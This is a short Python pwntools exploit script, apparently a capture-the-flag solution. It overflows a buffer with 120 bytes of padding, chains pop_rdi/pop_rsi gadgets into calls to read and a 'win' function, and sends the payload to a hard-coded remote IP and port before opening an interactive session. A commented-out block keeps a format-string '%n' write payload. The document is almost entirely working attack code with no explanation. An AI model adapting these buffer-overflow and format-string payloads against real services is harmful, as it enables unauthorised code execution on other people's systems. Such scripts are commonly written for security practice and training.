from pwn import *

import time
pop_rdi = 0x000000000040096c
ret = 0x00000000004006e9
flag = 0x6020ac
addbyte = 0x0000000000400c5e
pop_rsi= 0x0000000000400c51
seeme = 0x40096e
win = 0x4008d6
read = 0x0000000000400740
flagname = 0x400c7a
#p = b'a' * 112 + b'b'*8 + p64(seeme) + p64(ret) + p64(win)
p = b'a' * 112 + b'b'*8 + p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(flag) + p64(0) + p64(ret) + p64(read) + p64(ret) + p64(win) 


r = remote('34.76.206.46',10005)
r.sendline(b"kek")
r.sendline(b"2")
time.sleep(1)

r.sendline(p)
r.interactive()

"""
r.sendline(p)

import time
r.sendline(b"a" * 16+b"aaaa%9$n"+p64(flag))
r.interactive()
"""